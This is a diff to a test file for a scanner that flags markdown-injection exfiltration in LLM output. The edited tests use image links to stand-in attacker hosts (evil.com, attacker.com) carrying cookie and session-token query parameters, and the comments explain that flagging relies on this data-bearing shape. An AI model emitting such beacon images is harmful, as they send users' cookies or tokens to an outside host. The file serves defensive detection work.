@@ -206,12 +206,18 @@ class TestMarkdownInjection:
         return scanner.scan(output_text=text)
 
     def test_hidden_image_beacon(self):
-        result = self._scan("Here you go: ![](https://evil.com/track?id=123)")
+        # FP-safe contract (FINAL conservative O fix): an image is a beacon
+        # ONLY when it carries an EXFIL SHAPE (data-bearing query param), not a
+        # bare arbitrary host -- benign LLM output references images on
+        # arbitrary hosts. A `?data=` beacon is the unambiguous exfil shape.
+        result = self._scan("Here you go: ![](https://evil.com/track?data=document.cookie)")
         assert result.is_suspicious
         assert any("Markdown" in f or "markdown" in f.lower() for f in result.flags)
 
     def test_markdown_image_with_alt(self):
-        result = self._scan("![1px](https://attacker.com/pixel.gif)")
+        # FP-safe contract: the tracking pixel must carry an exfil-bearing
+        # query param to be flagged (a bare arbitrary-host image is benign).
+        result = self._scan("![1px](https://attacker.com/pixel.gif?token=SESSION_abc)")
         assert result.is_suspicious
 
     def test_javascript_link(self):
